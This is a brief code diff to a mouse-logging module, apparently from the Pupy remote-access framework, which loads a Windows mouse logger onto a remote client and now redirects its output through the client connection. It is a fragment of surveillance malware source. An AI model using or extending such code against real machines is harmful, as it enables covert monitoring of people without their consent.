@@ -8,7 +8,7 @@ import traceback
 import time
 import os
 import os.path
-from pupylib.utils.rpyc_utils import obtain
+from pupylib.utils.rpyc_utils import obtain, redirected_stdo
 
 def pil_save(filename, pixels, width, height):
 	from PIL import Image, ImageFile
@@ -50,7 +50,8 @@ class MouseLoggerModule(PupyModule):
 			else:
 				self.client.load_package("pupwinutils.mouselogger")
 				self.mouselogger=self.client.conn.modules["pupwinutils.mouselogger"].MouseLogger()
-				self.mouselogger.start()
+				with redirected_stdo(self.client.conn):
+					self.mouselogger.start()
 		else:
 			if not self.mouselogger:
 				self.error("the mouselogger is not running")
